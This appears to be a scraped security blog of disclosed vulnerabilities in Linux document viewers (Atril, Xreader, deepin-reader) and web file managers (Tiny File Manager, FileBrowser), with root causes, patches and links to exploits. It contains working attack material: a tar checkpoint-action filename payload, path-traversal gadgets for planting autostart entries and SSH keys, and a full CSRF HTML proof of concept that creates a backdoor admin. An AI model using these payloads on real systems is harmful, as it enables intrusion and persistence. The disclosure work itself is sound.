The specific flaw exists within the parsing of CBT files. The issue results from the lack of proper validation of a user-supplied string before using it to execute a system call. An attacker can leverage this vulnerability to execute code in the context of the current user.

This vulnerability is due to a bad code segment in Atril and Xreader responsible for handling comic book documents (.cbr, .cbz, .cbt, .cb7). Comic book documents are just archives that contain images in it. The vulnerability here can be exploited using a maliciously crafted CBT document which is a TAR archive.

Root Cause – Vulnerable Code segment in both doc viewers (comics-document.c):

```

static const ComicBookDecompressCommand command_usage_def[] = {
        /* RARLABS unrar */
    {"%s p -c- -ierr --", "%s vb -c- -- %s", NULL             , FALSE, NO_OFFSET},

        /* GNA! unrar */
    {NULL               , "%s t %s"        , "%s -xf %s %s"   , FALSE, NO_OFFSET},

        /* unzip */
    {"%s -p -C --"      , "%s %s"          , NULL             , TRUE , OFFSET_ZIP},

        /* 7zip */
    {NULL               , "%s l -- %s"     , "%s x -y %s -o%s", FALSE, OFFSET_7Z},

        /* tar */
    {"%s -xOf"          , "%s -tf %s"      , NULL             , FALSE, NO_OFFSET},

    /* UNARCHIVER */
    {"unar -o -"        , "%s %s"          , NULL         , FALSE, NO_OFFSET}
};

```

By looking at the above code, we can see that there are shell commands used for decompression. Look at the /\* tar \*/ section, it actually calls the following shell command, “tar -xOf -tf ![]()“. This is to view/load each image inside the CBT document. This behavior can be exploited by using an option of tar program ‘–checkpoint-action’ to execute arbitrary commands on the target by naming one of the images inside the CBT document to something like ‘–checkpoint-action=EXEC=bash -c “whoami>/tmp/who.txt”;.jpg’.

This vulnerability was already found in Evince Document viewer (the default Doc reader of GNOME) back in 2017. Since Atril and Xreader are forks of Evince, this vulnerability was present in both Atril and Xreader. Atril’s team fixed the vulnerability at that time by adding a piece of code that quits Atril’s process if the CBT file with “–checkpoint-action=” in its name. The following was the patch (comics-document.c) (line – 983):

```

extract_argv (EvDocument *document, gint page)
{
    ComicsDocument *comics_document = COMICS_DOCUMENT (document);
    char **argv;
    char *command_line, *quoted_archive, *quoted_filename;
    GError *err = NULL;

    if (g_strrstr (comics_document->page_names->pdata[page], "--checkpoint-action="))
    {
        g_warning ("File unsupported\n");
        gtk_main_quit ();
    }

```

As you can see, it throws a “File Unsupported” message to the console and quits when it sees “–checkpoint-action=” in a page/filename. I noticed that this only works with an empty file or a really small image file, and if we provide a larger file with more bytes, the “gtk\_main\_quit ();” function fails, so it continues to run, thus executing the injected arbitrary command.

In the MATE desktop environment, many XFCE and lightweight desktop environments (including OS like Kali, Parrot, Xubuntu, Ubuntu Mate, Kylin, Fedora Mate, Manjaro Mate), this vulnerability can be exploited just by sending a link/URL because these Operating Systems/Environments has Atril and Atril has an additional component called atril-previewer that will trigger the exploit without even opening or clicking on the document. An attacker can craft a webpage that instantly downloads the crafted CBT file onto the target system when the target user visits the webpage and the latest Firefox browser nowadays downloads automatically by default without user confirmation, when the user navigates to his Downloads directory the payload will be executed, gives the attacker the shell.

In Linux Mint (Cinnamon Desktop Environment), the target user must open the document to trigger the payload because Linux Mint uses Xreader and Xreader doesn’t have a previewer.

**Exploit**: <https://github.com/febinrev/atril_cbt-inject-exploit.git>

Exploit Dependencies: poppler-utils
Please install poppler-utils before running the exploit script on your Linux machine (Kali preferred). Installation: apt install poppler-utils.

**Github Advisory on MATE Atril**: <https://github.com/mate-desktop/atril/security/advisories/GHSA-34rr-j8v9-v4p2>

**Zero Day Initiative Advisory on Mint Xreader**: <https://www.zerodayinitiative.com/advisories/ZDI-23-1836/>

Thanks for Reading!

# [CVE-2023-44451, CVE-2023-52076: EPUB File Parsing Directory Traversal RCE Vulnerability affecting popular distros](https://febin0x4e4a.wordpress.com/2024/01/17/cve-2023-44451-cve-2023-52076-epub-file-parsing-directory-traversal-rce-vulnerability-affecting-popular-distros/)

[17th January 202417th January 2024](https://febin0x4e4a.wordpress.com/2024/01/17/cve-2023-44451-cve-2023-52076-epub-file-parsing-directory-traversal-rce-vulnerability-affecting-popular-distros/) / [FebiNJ](https://febin0x4e4a.wordpress.com/author/febin0x4e4a/)  / [Leave a comment](https://febin0x4e4a.wordpress.com/2024/01/17/cve-2023-44451-cve-2023-52076-epub-file-parsing-directory-traversal-rce-vulnerability-affecting-popular-distros/#respond)

My 8th and 10th CVEs

**Slippy-book: EPUB File Parsing Directory Traversal Remote Code Execution**

### CVE-2023-44451 (Xreader), CVE-2023-52076(Atril)(Reserved):

RCE Vulnerability affected popular Linux Distros including Mint, Kali, Parrot, Manjaro etc. EPUB File Parsing Directory Traversal Remote Code Execution

A Critical Path traversal and Arbitrary file write vulnerability has been discovered in the default document viewer software of Linux’s MATE/ and Linux Mint affecting popular operating systems such as Kali Linux, Parrot Security OS, Ubuntu-Mate, Linux Mint, Xubuntu, and all the other Operating Systems that use MATE or Atril/Xreader as default doc viewer.

The vulnerability exists in Atril Document Viewer and Xreader Document Viewer which are the default document viewers of the MATE environment and Linux Mint respectively. Atril is the default document reader for Kali Linux, Ubuntu-Mate, Parrot Security OS, and Xubuntu, and Xreader is the default document reader for Linux Mint.

This vulnerability is capable of writing arbitrary files anywhere on the filesystem to which the user opening a crafted document has access, the only limitation is that this vulnerability cannot be exploited to overwrite existing files but that doesn’t stop an attacker from achieving Remote Command Execution on the target system.

I named this vulnerability “*Slippy-Book*“

**Severity**: CRITICAL

**Impact**: Remote Command Execution, System compromise

This can be used particularly against security researchers who mostly use Kali and Parrot OS and also desktop users who use Linux Mint.

Remote Command Execution can be achieved in many ways:

1. The most efficient way to achieve RCE is by placing a malicious .desktop entry under $HOME/.config/autostart/ directory, and the .desktop will execute when the user logs out and logs back in, the autostart/ directory acts as the startup folder in Windows, and it will execute all the .desktop entries that are present inside at startup. We can place an infinite number of .desktop files with random names under autostart/ directory to achieve RCE, no need to overwrite any file.
2. By writing the authorized\_keys file under the .ssh/ directory inside the user’s home, in this way, an attacker can immediately achieve Command Execution via SSH if the target system has SSH enabled.
3. RCE can be achieved in another way just by writing files like .bash\_profile, .bash\_login, .zshrc, .cshrc, .vimrc, .xsession under the user’s home directory. Many of these files might be missing in operating systems, it depends on the OS. In Ubuntu-mate and Linux Mint, .bash\_profile, and .bash\_login files won’t be present, and placing those files with malicious commands written inside under the user’s home directory will result in RCE if the user logs in to the system without GUI mode, like SSH login.
4. Another way to achieve control over the target system is by writing files in places like ~/.local/bin, ~/.local/lib/python3.9/site-packages/, ~/.local/lib/python3.10/site-packages/, ~/.local/lib/python3.11/site-packages/, ~/.local/share/applications/, /var/www/html/, /var/www/ and so on.

**[+] Finding the Vulnerability:**

I was researching archive file formats such as Zip, Tar, Rar, etc., and the software that works with archives, then I got the idea to get into the Ebook file format (.epub) because .epub files are really Zip archives with some XML, HTML and other files packed inside. Even though Epub files are just zip files, epub format has its own standards.

**[\*] How did I find the vulnerability?**

People have been exploiting Archives since the early 2000s, researchers are constantly looking into Archives and archiving software for vulnerabilities and Zero-day acquisition companies like Zerodium are willing to pay million-dollar bounties for zero-days in archives and archivers. So, I thought to give it a try. I am not a binary ninja or kernel exploitation specialist to pull off a highly complicated exploit chain that could give me a code execution or elevation of privilege. My approach was, “What is the dumbest thing that could possibly work”.

Path traversal is one of the most common vulnerabilities that affect Archives and software that deals with archives, Zip Slip is one such vulnerability that leads to arbitrary file overwrite and Code execution that was disclosed on the 5th of June 2018 by the Snyk Security team, Zip Slip was a widespread vulnerability affected many software and libraries that handle Zip archives. Path traversal in zip archives was an ancient bug in the wild even before that was disclosed by the Snyk Security team. It is still present in many software including some Android file managers.
Another such vulnerability was discovered in WinRar with the CVE Id CVE-2018-20250, in which a potential path traversal can be exploited to achieve RCE.

Archives were developed in a period when people not much cared about security, and that’s where all the problems began.

Knowing that Path traversals can be a problem in the archive, I started testing it out on EPUB. I started off by downloading a sample .epub file from the internet and started playing with it. Then I did something really interesting, I added my own files into the .epub file by using the “zip -u” command.

`$ zip -u sample1.epub hello.txt`

And then when I listed the contents of the EPUB archive using “unzip -l”, I was able to see my hello.txt was present inside the EPUB. Perfect! So what’s next? As I said above, my approach was, “What is the dumbest thing that could possibly work” so what I did next was add a bunch of Path Traversal gadgets (../../) at the beginning of my filename hello.txt.

I was using Kali Linux and logged in as root during the research on archives.
Then, I navigated to the directory graphically and clicked on the EPUB document, the document opened up and nothing happened but after that, I noticed something really interesting, the hello.txt file was present under my Kali Linux’s root (/). I tried overwriting existing files but that didn’t work.

Then, I tried changing the filename to something like ../../../../tmp/test.txt and that worked too, a file named test.txt was successfully created under /tmp upon opening the epub document. First I thought it was a vulnerability in Kali Linux and downloaded the latest ISO of Kali from their official site and built a VM to test it out. Guess what? It worked on the latest version of Kali too. The software responsible for opening epub files in Kali is Atril, I then went to Google to read more about Atril Document Viewer and found out that it is the default Document reader for MATE desktop environment. After knowing that, I immediately switched to my Parrot OS VM to reproduce the same vulnerability, and that worked in Parrot OS as well. I also tested it out on Ubuntu’s MATE variant called Ubuntu-MATE and found that it was also vulnerable. The MATE desktop environment itself is vulnerable.

I also tried to reproduce this on various other Linux distros with other Desktop Environments and found out that Linux Mint is also vulnerable.

#### [+] Achieving Remote Command Execution:

This vulnerability can’t be exploited to overwrite existing files, it can only create new files under any specified locations, but that doesn’t stop us from achieving RCE. I tried out using the vulnerability to write a .desktop entry under $HOME/.config/autostart and then I logged out and logged back in, the malicious .desktop entry got triggered and I got Remote Command Execution. I also tried placing an authorized\_keys file under .ssh/ directory and achieved RCE via SSH. Note: If a directory is not present it will create the directory automatically.

Who knows about the Ebook format? Hasn’t everyone switched to PDF?

The answer is no, EPUB is still a popular and powerful document format, but many people prefer PDF. Most of them are familiar with PDFs. So, I was trying to maximize this vulnerability impact. Another Interesting thing I noticed was, when renaming the .epub document to something.pdf, the vulnerable Document Viewer (Atril/Xreader) tries to open the something.pdf file and reads it as an EPUB document because it is responsible for reading both EPUB and PDF, it also supports many other document formats as well. In other words, we can rename our crafted something.epub to something.pdf and then send it to the target to achieve RCE on the target.

So everything is good, we could create an exploit that’ll craft an epub/pdf pair to write malicious .desktop entries under /home//.config/autostart/ directory. But there’s a small problem, the target user’s username is required for successful exploitation of this bug. What if we don’t know the username? No Easy RCE? Needs to guess Username? Needs to try random common usernames? Let’s see what I got..

Upon further analysis, I found out that we can use the /proc/self/cwd to access the user’s home directory if he downloads the crafted document and opens it somewhere inside his home directory such as the ~/Downloads/, ~/Documents/ directory. So we can exploit the path traversal bug to achieve RCE just by using the gadget ../../../../../proc/self/cwd/../.config/autostart/exploit.desktop.

I have created a fully working exploit for this vulnerability (exploit\_rce.sh) and a script to write and include custom files for path traversal (exploit\_file\_write.sh).

**Exploit**: <https://github.com/febinrev/slippy-book-exploit.git>

**Zero Day Initiative Advisory:** <https://www.zerodayinitiative.com/advisories/ZDI-23-1835/>

*Update the Document Viewers to the latest version on your Distros!*

Thanks for Reading.

# [CVE-2023-50254: Critical RCE in Deepin Linux Desktop OS’s default document reader](https://febin0x4e4a.wordpress.com/2023/12/22/cve-2023-50254-critical-rce-in-deepin-linux-desktop-oss-default-document-reader/)

[22nd December 202322nd December 2023](https://febin0x4e4a.wordpress.com/2023/12/22/cve-2023-50254-critical-rce-in-deepin-linux-desktop-oss-default-document-reader/) / [FebiNJ](https://febin0x4e4a.wordpress.com/author/febin0x4e4a/)  / [Leave a comment](https://febin0x4e4a.wordpress.com/2023/12/22/cve-2023-50254-critical-rce-in-deepin-linux-desktop-oss-default-document-reader/#respond)

This is my 6th published CVE.

### Summary

Deepin Linux’s default document reader “**deepin-reader**” software ***<** **6.0.7***suffers from a serious vulnerability due to a design flaw that leads to Remote Command Execution via crafted docx document.

### Details

Deepin-reader is the default document reader for the Operating System Deepin Linux. The deepin-reader performs some shell command operations while dealing with docx document format.

1. When opening a docx document, deepin-reader creates a temporary directory under /tmp and place the docx document under the directory
2. Then deepin-reader calls the “unzip” shell command to extract the docx file
3. After the extraction process, deepin-reader calls “pandoc” command to convert the docx file to an HTML file named “temp.html” under word/ directory (created when the docx file is extracted with unzip).
   The command will look something like this, “pandoc temp.docx -o word/temp.html
4. Then deepin-reader will try to convert that HTML file to PDF and open the pdf.

![](https://febin0x4e4a.wordpress.com/wp-content/uploads/2023/12/image.png?w=1024)

This happens when we open a docx file in Deepin Linux OS.

This behavior can be exploited by placing a symlink named word/temp.html inside a crafted malicious docx pointing to any file inside the target system.

So, while opening the docx file, pandoc will write to the system file that the symlink word/temp.html is pointing to.

This is a File overwrite vulnerability.
A Remote Code Execution can be achieved by overwriting files like .bashrc, .bash\_login etc. Rce will be triggered when the user opens the terminal.

We can force pandoc to write/overwrite files(.bashrc) in the right format to execute arbitrary commands.

**Advisory:** <https://github.com/linuxdeepin/developer-center/security/advisories/GHSA-q9jr-726g-9495>

Update Deepin Linux and deepin-reader to the latest version.

**Download the PoC exploit**: [https://github.com/febinrev/deepin-linux\_reader\_RCE-exploit/](https://github.com/febinrev/deepin-linux_reader_RCE-exploit/tree/main)

# [Tiny File Manager Authenticated RCE](https://febin0x4e4a.wordpress.com/2022/01/23/tiny-file-manager-authenticated-rce/)

[23rd January 202215th March 2022](https://febin0x4e4a.wordpress.com/2022/01/23/tiny-file-manager-authenticated-rce/) / [FebiNJ](https://febin0x4e4a.wordpress.com/author/febin0x4e4a/)  / [Leave a comment](https://febin0x4e4a.wordpress.com/2022/01/23/tiny-file-manager-authenticated-rce/#respond)

**CVE-2021-45010**

**Introduction**

This is *Febin*, a security professional.

I used to pick random opensource software for my research, recently I took some web-based file management software as my research targets. There I found some popular web-based file managers, one of which was a software named “[Tiny File Manager](https://github.com/prasathmani/tinyfilemanager)“. While poking around I was able to find an awesome vulnerability in the application that leads to code execution on the server. This article is going to be on that vulnerability.

**Disclosure Timeline:**

A similar Vulnerability was also reported by another researcher named “Omri Inbar”.

My disclosure timeline:

September 16, 2021 – Contacted the developer and reported the vulnerability

September 17, 2021 – Developer replies back

September 20, 2021 – Developer verified the issue

September 26, 2021 – I patched the source code, fixed the RCE, and sent a pull request to the original repository.

November 12, 2021 – The developer merged the commit. The vulnerability has been fixed.

**CVE-2021-45010**: A Path traversal vulnerability in the file upload functionality in tinyfilemanager.php in Tiny File Manager Project’s Tiny File Manager <= 2.4.3 allows remote attackers with valid user accounts to upload malicious PHP files to the webroot and achieve code execution on the target server.

**Vendor/Software Details**

TinyFileManager is a web-based file manager and it is a simple, fast, and small file manager with a single file, a multi-language ready web application for storing, uploading, editing, and managing files and folders online via the web browser. The Application runs on PHP 5.5+, It allows the creation of multiple users and each user can have its own directory and build-in support for managing text files with cloud9 IDE and it supports syntax highlighting for over 150+ languages and over 35+ themes.

Link: <https://github.com/prasathmani/tinyfilemanager>

**Authenticated RCE**

Tiny File Manager is a php based software. This particular vulnerability is present in the tinyfilemanager.php script. When the user logs in to the application, he is allowed to upload, download, edit files and those file are stored in a specific directory which is been specified in “config.php”. The particular vulnerability that I have found allows the user to upload files beyond the specified directory by tampering the “fullpath” parameter and add a bunch of “../” in front of the actual filename thus leads to breaking out of the file root directory that is specified in config.php.

This can be exploited to place php web-shells inside the web root directory of Tiny File Manager and achieve RCE.

Proof Of Concept:

*RCE*
1. An Attacker who has admin credentials or admin access to “Tiny FIle manager” app can upload arbitrary files to the server via Path Traversal i.e, appending “../../../../../../../” to the “fullpath parameter in the upload feature.

![](https://febin0x4e4a.wordpress.com/wp-content/uploads/2022/01/tiny_rce.png?w=1024)

2. If the attacker could get the full Web Root directory of the “Tiny File Manager” app, he could upload php files there to achieve RCE.

3. To get the full Webroot directory path, we can abuse a path disclosure vulnerability in the URL upload feature. When a random rubbish URL is given as input, it throws an error message that reveals the full Webroot directory path.

![](https://febin0x4e4a.wordpress.com/wp-content/uploads/2022/01/tiny_disclose.png?w=1024)

4. By combining these, we can achieve Command execution on the server.

I created an exploit script that automatically exploits the bug and get a shell:

![](https://febin0x4e4a.wordpress.com/wp-content/uploads/2022/01/tiny_rce3.png?w=1024)

Download the Exploit: *<https://raw.githubusercontent.com/febinrev/tinyfilemanager-2.4.3-exploit/main/exploit.sh>*

**The Patch:**

[![](https://blogger.googleusercontent.com/img/a/AVvXsEjN1KCb8kg6dntu-z3RCtbjZonqDLsdOlyGxc8kf-BIrMEogUQ0Q3atzazr1peUM4Rjc3lKbwONdOmJWH4pIFv1Dxkd2hsVweH9qMOIEIDgS1GNiMHyT7hOR0qlsXL0ZG9RsVUdAP8XijSvObEjSVr03M5BSrJjO-9BbyJ54m29qSeAKWL6WDJspUhLEA=w484-h87)](https://blogger.googleusercontent.com/img/a/AVvXsEjN1KCb8kg6dntu-z3RCtbjZonqDLsdOlyGxc8kf-BIrMEogUQ0Q3atzazr1peUM4Rjc3lKbwONdOmJWH4pIFv1Dxkd2hsVweH9qMOIEIDgS1GNiMHyT7hOR0qlsXL0ZG9RsVUdAP8XijSvObEjSVr03M5BSrJjO-9BbyJ54m29qSeAKWL6WDJspUhLEA%3Ds1232)

<https://github.com/prasathmani/tinyfilemanager/pull/636/files/a93fc321a3c89fdb9bee860bf6df5d89083298d1>

👉  *Replace “./” with “\_” fixes the issue.*

**Thank You**

# [Critical CSRF in FileBrowser](https://febin0x4e4a.wordpress.com/2022/01/19/critical-csrf-in-filebrowser/)

[19th January 202222nd March 2022](https://febin0x4e4a.wordpress.com/2022/01/19/critical-csrf-in-filebrowser/) / [FebiNJ](https://febin0x4e4a.wordpress.com/author/febin0x4e4a/)  / [Leave a comment](https://febin0x4e4a.wordpress.com/2022/01/19/critical-csrf-in-filebrowser/#respond)

### CVE-2021-46398

**Introduction**

This is *Febin*, a security professional.

I used to pick random opensource software for my research, recently I took some web-based file management software as my research targets. There I found some popular web-based file managers, one of them was a software named “FileBrowser”. While poking around I was able to find an awesome vulnerability in the application that leads to account takeover, complete access to the filesystem, and command execution. This article is going to be on that vulnerability.

[![](https://raw.githubusercontent.com/filebrowser/logo/master/banner.png)](https://raw.githubusercontent.com/filebrowser/logo/master/banner.png)
[![](https://user-images.githubusercontent.com/5447088/50716739-ebd26700-107a-11e9-9817-14230c53efd2.gif)](https://user-images.githubusercontent.com/5447088/50716739-ebd26700-107a-11e9-9817-14230c53efd2.gif)

**Disclosure Timeline:**

October 16, 2021 – Contacted the vendor and reported the vulnerability

October 19, 2021 – Vendor replies back

October 30, 2021 – Vulnerability has been patched in version **v2.18.0**

February 4, 2022 – CVE ID was assigned. CVE-2021-46398

**Vendor/Software – Product Details**

Filebrowser provides a file managing interface within a specified directory and it can be used to upload, delete, preview, rename and edit your files. It allows the creation of multiple users and each user can have its own directory. It can be used as a standalone app or as a middleware.

Link**:** <https://filebrowser.org/>

**GitHub** **repo:** <https://github.com/filebrowser/filebrowser>

**The Vulnerability:** ***CSRF to RCE***

FileBrowser is a popular file manager/file managing interface developed in the Go language. Admin can create multiple users, even another Admin privileged user, and give access to any directory he wants, the user creation is handled by an endpoint “/api/users”.

The endpoint accepts input in JSON format to create users, but fails to verify that the “Content-Type” HTTP header, the Content-Type header’s value should be “application/json” but it accepts “text/plain” and that’s where the vulnerability arises. Also, the “Origin” is not validated and there are no anti-CSRF tokens implemented either.

Hence an attacker can easily exploit this vulnerability to create a backdoor user with admin privileges and access to the home directory or whichever directory the attacker wants to access, just by sending a malicious webpage URL to the legitimate admin and access the whole filesystem of the victim.

And an admin can run commands on the system, so this vulnerability leads to an RCE.

![](https://febin0x4e4a.wordpress.com/wp-content/uploads/2022/01/fbrowser_csrf_request-1.png?w=756)

**Affected Versions: *v2.17.2 and below versions were affected. =< 2.17.2***

**Proof Of Concept:** **The below HTML code will exploit the Flaw**
<html>

<body style=”text-align:center;”>
  <h1> FileBrowser CSRF PoC by Febin </h1>
    <form action=”<http://ubuntu.local:8080/api/users>” method=”POST” enctype=”text/plain”>

<input type=”hidden” name='{“what”:”user”,”which”:[],”data”:{“scope”:”../../../../root/”,”locale”:”en”,”viewMode”:”mosaic”,”singleClick”:false,”sorting”:{“by”:””,”asc”:false},”perm”:{“admin”:true,”execute”:true,”create”:true,”rename”:true,”modify”:true,”delete”:true,”share”:true,”download”:true},”commands”:[],”hideDotfiles”:false,”username”:”pwned”,”password”:””,”rules”:[{“allow”:true,”path”:”../”,”regex”:false,”regexp”:{“raw”:””}}],”lockPassword”:false,”id”:0,”password”:”pwned”}}’ value=’test’>
      <input type=”submit” value=”CLICK ME!”>
    </form>

</body>

</html>

**Exploit-DB:** <https://www.exploit-db.com/exploits/50717>

**1. I started a filebrowser instance inside my ubuntu VM**

![](https://febin0x4e4a.wordpress.com/wp-content/uploads/2022/01/fb_csrf.png?w=942)

**2. I hosted the exploit on a simple HTTP server inside my host OS.**

![](https://febin0x4e4a.wordpress.com/wp-content/uploads/2022/01/fbrowser_csrf1-1.png?w=1024)
![](https://febin0x4e4a.wordpress.com/wp-content/uploads/2022/01/fbrowser_csrf2.png?w=1024)

**3. When I click the “CLICK ME!” button, it sends a POST request in the background towards the filebrowser URL  and that creates a backdoor user named “pwned” with access to the “/root/” directory.**

![](https://febin0x4e4a.wordpress.com/wp-content/uploads/2022/01/fbrowser_csrf3.png?w=648)
![](https://febin0x4e4a.wordpress.com/wp-content/uploads/2022/01/fbrowser_csrf4.png?w=1024)

Logged in as pwned user.

![](https://febin0x4e4a.wordpress.com/wp-content/uploads/2022/01/fbrowser_csrf_root.png?w=1024)

Root Cause:
1. X-Auth header is not validated properly

2. No Anti-CSRF token

3. Using content-type “text/plain” makes the attack possible

4. Origin header is not validated

![](https://febin0x4e4a.wordpress.com/wp-content/uploads/2022/01/fbrowser_csrf_request.png?w=756)

**RCE:**

Refer:

<https://filebrowser.org/configuration/command-runner>

![](https://febin0x4e4a.wordpress.com/wp-content/uploads/2022/01/command-runner.png?w=855)

**PATCH**

Update to the latest version as the flaw has been patched from v2.18.0

Commit: <https://github.com/filebrowser/filebrowser/commit/74b7cd8e81840537a8206317344f118093153e8d>

**CVE-2021-46398**

**Thank you.**

Search for:

# Recent Posts

* [Privilege Escalation Vulnerability in Balena Etcher Software](https://febin0x4e4a.wordpress.com/2024/08/22/privilege-escalation-vulnerability-in-balena-etcher-software/)
* [CVE-2024-28739, CVE-2024-28740: XSS to One-Click RCE in Koha ILS](https://febin0x4e4a.wordpress.com/2024/03/07/xss-to-one-click-rce-in-koha-ils/)
* [CVE-2023-44452, CVE-2023-51698: CBT File Parsing Argument Injection that affected Popular Linux Distros](https://febin0x4e4a.wordpress.com/2024/01/17/cve-2023-44452-cve-2023-51698-cbt-file-parsing-argument-injection-that-affected-popular-linux-distros/)
* [CVE-2023-44451, CVE-2023-52076: EPUB File Parsing Directory Traversal RCE Vulnerability affecting popular distros](https://febin0x4e4a.wordpress.com/2024/01/17/cve-2023-44451-cve-2023-52076-epub-file-parsing-directory-traversal-rce-vulnerability-affecting-popular-distros/)
* [Zip Path Traversal in Asus Smartphone’s default FileManager App.](https://febin0x4e4a.wordpress.com/2024/01/10/zip-path-traversal-in-asus-smartphones-default-filemanager-app/)
# Recent Comments

# Archives

* [August 2024](https://febin0x4e4a.wordpress.com/2024/08/)
* [March 2024](https://febin0x4e4a.wordpress.com/2024/03/)
* [January 2024](https://febin0x4e4a.wordpress.com/2024/01/)
* [December 2023](https://febin0x4e4a.wordpress.com/2023/12/)
* [October 2023](https://febin0x4e4a.wordpress.com/2023/10/)
* [September 2023](https://febin0x4e4a.wordpress.com/2023/09/)
* [January 2023](https://febin0x4e4a.wordpress.com/2023/01/)
* [March 2022](https://febin0x4e4a.wordpress.com/2022/03/)
* [January 2022](https://febin0x4e4a.wordpress.com/2022/01/)
# Categories

* [Uncategorized](https://febin0x4e4a.wordpress.com/category/uncategorised/)

[Create a free website or blog at WordPress.com.](https://wordpress.com/?ref=footer_website)

* Subscribe
  Subscribed

  + [![](https://febin0x4e4a.wordpress.com/wp-content/uploads/2022/01/cropped-hacker-operate-laptop-cartoon-illustration_188898-166.jpg?w=50) febiNJ](https://febin0x4e4a.wordpress.com)

  Sign me up

  + Already have a WordPress.com account? [Log in now.](https://wordpress.com/log-in?redirect_to=https%3A%2F%2Ffebin0x4e4a.wordpress.com%2F2024%2F01%2F17%2Fcve-2023-44452-cve-2023-51698-cbt-file-parsing-argument-injection-that-affected-popular-linux-distros%2F&signup_flow=account)
* Privacy
* + [![](https://febin0x4e4a.wordpress.com/wp-content/uploads/2022/01/cropped-hacker-operate-laptop-cartoon-illustration_188898-166.jpg?w=50) febiNJ](https://febin0x4e4a.wordpress.com)
  + Subscribe
    Subscribed
  + [Sign up](https://wordpress.com/start/)
  + [Log in](https://wordpress.com/log-in?redirect_to=https%3A%2F%2Ffebin0x4e4a.wordpress.com%2F2024%2F01%2F17%2Fcve-2023-44452-cve-2023-51698-cbt-file-parsing-argument-injection-that-affected-popular-linux-distros%2F&signup_flow=account)
  + [Report this content](https://wordpress.com/abuse/?report_url=https://febin0x4e4a.wordpress.com)
  + [View site in Reader](https://wordpress.com/read/blogs/201901473)
  + [Manage subscriptions](https://subscribe.wordpress.com/)
  + Collapse this bar

##

##

Loading Comments...

Write a Comment...

Email (Required)

Name (Required)

Website

###

![](https://pixel.wp.com/b.gif?v=noscript)
Design a site like this with WordPress.com[Get started](https://wordpress.com/start/?ref=marketing_bar)


=== Content from febin0x4e4a.wordpress.com_efd908f9_20250115_193557.html ===

# [febiNJ](https://febin0x4e4a.wordpress.com/)

## InfoSec Enthusiast

Menu
[Skip to content](#content)

* [Home](https://febin0x4e4a.wordpress.com/)
* [About](https://febin0x4e4a.wordpress.com/about/)

Search

Search for:

# CVE-2021-46398

# [Critical CSRF in FileBrowser](https://febin0x4e4a.wordpress.com/2022/01/19/critical-csrf-in-filebrowser/)

[19th January 202222nd March 2022](https://febin0x4e4a.wordpress.com/2022/01/19/critical-csrf-in-filebrowser/) / [FebiNJ](https://febin0x4e4a.wordpress.com/author/febin0x4e4a/)  / [Leave a comment](https://febin0x4e4a.wordpress.com/2022/01/19/critical-csrf-in-filebrowser/#respond)

### CVE-2021-46398

**Introduction**

This is *Febin*, a security professional.

I used to pick random opensource software for my research, recently I took some web-based file management software as my research targets. There I found some popular web-based file managers, one of them was a software named “FileBrowser”. While poking around I was able to find an awesome vulnerability in the application that leads to account takeover, complete access to the filesystem, and command execution. This article is going to be on that vulnerability.

[![](https://raw.githubusercontent.com/filebrowser/logo/master/banner.png)](https://raw.githubusercontent.com/filebrowser/logo/master/banner.png)
[![](https://user-images.githubusercontent.com/5447088/50716739-ebd26700-107a-11e9-9817-14230c53efd2.gif)](https://user-images.githubusercontent.com/5447088/50716739-ebd26700-107a-11e9-9817-14230c53efd2.gif)

**Disclosure Timeline:**

October 16, 2021 – Contacted the vendor and reported the vulnerability

October 19, 2021 – Vendor replies back

October 30, 2021 – Vulnerability has been patched in version **v2.18.0**

February 4, 2022 – CVE ID was assigned. CVE-2021-46398

**Vendor/Software – Product Details**

Filebrowser provides a file managing interface within a specified directory and it can be used to upload, delete, preview, rename and edit your files. It allows the creation of multiple users and each user can have its own directory. It can be used as a standalone app or as a middleware.

Link**:** <https://filebrowser.org/>

**GitHub** **repo:** <https://github.com/filebrowser/filebrowser>

**The Vulnerability:** ***CSRF to RCE***

FileBrowser is a popular file manager/file managing interface developed in the Go language. Admin can create multiple users, even another Admin privileged user, and give access to any directory he wants, the user creation is handled by an endpoint “/api/users”.

The endpoint accepts input in JSON format to create users, but fails to verify that the “Content-Type” HTTP header, the Content-Type header’s value should be “application/json” but it accepts “text/plain” and that’s where the vulnerability arises. Also, the “Origin” is not validated and there are no anti-CSRF tokens implemented either.

Hence an attacker can easily exploit this vulnerability to create a backdoor user with admin privileges and access to the home directory or whichever directory the attacker wants to access, just by sending a malicious webpage URL to the legitimate admin and access the whole filesystem of the victim.

And an admin can run commands on the system, so this vulnerability leads to an RCE.

![](https://febin0x4e4a.wordpress.com/wp-content/uploads/2022/01/fbrowser_csrf_request-1.png?w=756)

**Affected Versions: *v2.17.2 and below versions were affected. =< 2.17.2***

**Proof Of Concept:** **The below HTML code will exploit the Flaw**
<html>

<body style=”text-align:center;”>
  <h1> FileBrowser CSRF PoC by Febin </h1>
    <form action=”<http://ubuntu.local:8080/api/users>” method=”POST” enctype=”text/plain”>

<input type=”hidden” name='{“what”:”user”,”which”:[],”data”:{“scope”:”../../../../root/”,”locale”:”en”,”viewMode”:”mosaic”,”singleClick”:false,”sorting”:{“by”:””,”asc”:false},”perm”:{“admin”:true,”execute”:true,”create”:true,”rename”:true,”modify”:true,”delete”:true,”share”:true,”download”:true},”commands”:[],”hideDotfiles”:false,”username”:”pwned”,”password”:””,”rules”:[{“allow”:true,”path”:”../”,”regex”:false,”regexp”:{“raw”:””}}],”lockPassword”:false,”id”:0,”password”:”pwned”}}’ value=’test’>
      <input type=”submit” value=”CLICK ME!”>
    </form>

</body>

</html>

**Exploit-DB:** <https://www.exploit-db.com/exploits/50717>

**1. I started a filebrowser instance inside my ubuntu VM**

![](https://febin0x4e4a.wordpress.com/wp-content/uploads/2022/01/fb_csrf.png?w=942)

**2. I hosted the exploit on a simple HTTP server inside my host OS.**

![](https://febin0x4e4a.wordpress.com/wp-content/uploads/2022/01/fbrowser_csrf1-1.png?w=1024)
![](https://febin0x4e4a.wordpress.com/wp-content/uploads/2022/01/fbrowser_csrf2.png?w=1024)

**3. When I click the “CLICK ME!” button, it sends a POST request in the background towards the filebrowser URL  and that creates a backdoor user named “pwned” with access to the “/root/” directory.**

![](https://febin0x4e4a.wordpress.com/wp-content/uploads/2022/01/fbrowser_csrf3.png?w=648)
![](https://febin0x4e4a.wordpress.com/wp-content/uploads/2022/01/fbrowser_csrf4.png?w=1024)

Logged in as pwned user.

![](https://febin0x4e4a.wordpress.com/wp-content/uploads/2022/01/fbrowser_csrf_root.png?w=1024)

Root Cause:
1. X-Auth header is not validated properly

2. No Anti-CSRF token

3. Using content-type “text/plain” makes the attack possible

4. Origin header is not validated

